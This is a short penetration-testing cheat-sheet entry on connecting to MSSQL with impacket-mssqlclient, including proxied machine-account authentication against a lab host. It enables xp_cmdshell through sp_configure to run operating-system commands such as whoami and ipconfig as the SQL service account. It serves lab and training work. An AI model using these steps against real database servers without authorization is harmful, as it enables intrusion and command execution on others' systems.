# 17.09 MSSQL Login xp_cmdshell

> Connect to MSSQL with `impacket-mssqlclient` and run `enable_xp_cmdshell` for OS command execution as the SQL service account.

## Overview

Connect to MSSQL via impacket-mssqlclient. Enable xp_cmdshell for OS command execution. The impacket interactive client provides enable_xp_cmdshell as a shortcut.

## Steps

- **impacket-mssqlclient user:pass@host** — connect to SQL instance.
- **sp_configure + RECONFIGURE** — enable xp_cmdshell.
- **xp_cmdshell 'command'** — execute OS commands as SQL service account.

## Commands

### MSSQL connect + enable xp_cmdshell

```bash
impacket-mssqlclient ws_dev:password@<TARGET>
proxychains4 -q python3 examples/mssqlclient.py 'LAB/SCCM01$'@172.50.0.30 -windows-auth -no-pass
```

### Enable xp_cmdshell (SQL)

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'ipconfig';
```

### impacket interactive shortcuts

```sql
SQL (sa  dbo@master)> enable_xp_cmdshell
SQL (sa  dbo@master)> xp_cmdshell whoami
SQL (sa  dbo@master)> disable_xp_cmdshell
```
